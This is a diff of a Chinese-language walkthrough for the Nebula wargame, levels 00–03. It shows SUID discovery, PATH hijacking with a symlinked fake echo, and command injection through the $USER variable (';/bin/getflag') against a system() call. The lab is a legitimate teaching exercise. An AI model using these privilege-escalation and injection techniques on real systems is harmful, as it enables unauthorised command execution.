@@ -1,6 +1,6 @@
 # Nebula
 
-## level00
+## level00 -- 寻找SUID程序
 用`level00`账户登录，找出由`flag00`拥有的 Set User ID的程序
 
 ### Solution
@@ -18,6 +18,12 @@ $ find / -user flag00 2>/dev/null
 /rofs/home/flag00/.bashrc
 /rofs/home/flag00/.profile
 ```
+
+或者先查找flag00的uid。`cat /etc/passwd |grep flag00` 得到其uid为999，然后
+```
+$ find / -uid 999 2>/dev/null
+```
+也可以找到目标文件。
 尝试了一下，`/rofs/bin/.../flag00`即为目标程序。
 ```sh
 level00@nebula:~$ file /rofs/bin/.../flag00
@@ -38,7 +44,7 @@ flag00@nebula:~$ id
 uid=999(flag00) gid=1001(level00) groups=999(flag00),1001(level00)
 flag00@nebula:~$
 ```
-## level01
+## level01 -- 攻击环境变量$PATH(可执行任意命令)
 通过看源文件 level1.c
 发现要要通过`system()`来执行shell命令。
 ```c
@@ -52,6 +58,17 @@ system("/usr/bin/env echo and now what?");
 PATH=`pwd`:$PATH
 ```
 然后在这个我们自己写的echo文件中写入**getflag**就可以以flag01的身份得到flag了。
+
+由于/tmp目录对于任何用户都有完整的权限，虽然该目录下的文件在重启之后会消失，但我们可以在这个目录下操作。
+或者也可以在/tmp目录下创建一个`/bin/getflag`的符号链接(该文件为root所拥有，其他用户没有执行权限)。
+```
+$ ln -s /bin/getflag /tmp/echo
+```
+然后将/tmp目录加入到环境变量的最前面，
+```
+$ PATH=/tmp:$PATH
+```
+这样可以让我们的这个echo程序优先于`/bin/echo`程序执行。
 ## level02
 查看源文件level02.c
 发现
@@ -62,7 +79,9 @@ asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
         
 system(buffer);
 ```
-要从系统环境变量中得到$USER变量。然后执行`/bin/echo %s is cool`。
+通过getenv函数获得指定的环境变量UUSER的值(USER变量的值是当前登录的用户名)
+要从系统环境变量中得到$USER变量，再用asprintf函数将USER的值与其他字符串连接在一起并存放在buffer变量内，
+最后通过system函数执行buffer中的内容，即执行`/bin/echo %s is cool`。
 由于这里已经写死了。用`/bin/echo`这个可执行文件，所以我们不能对echo文件做手脚了。
 然而这个$USER变量是我们可控的。
 于是我们
@@ -90,8 +109,14 @@ You have successfully executed getflag on a target account
 ```sh
 $ USER="test && /bin/getflag"
 ```
-反正这个 $USER 变量是我们可控的，我们可以已flag03的身份执行任意字符串。
-## level03
+或者
+```sh
+$ USER=";/bin/getflag"
+```
+即以flag02的身份执行`/bin/echo;/bin/getflag`。
+反正这个 $USER 变量是我们可控的，我们可以已flag02的身份执行任意字符串。
+关于这里的`;` 和`&&`的区别。`;`表示执行完上一句紧接着执行下一句，而`&&`得在上一条命令执行成功之后再执行下一句。
+## level03 -- 攻击计划任务(crontab)
 
 ```sh
 for i in /home/flag03/writeable.d/* ; do
@@ -101,7 +126,7 @@ done
 ```
 其中ulimit -t 5控制CPU时间不超过5秒，bash -x "$i"用于执行$i文件。执行完之后删除文件本身。
 
-
+## level04 -- 绕过权限获得token
 
 ## level07
 参考:
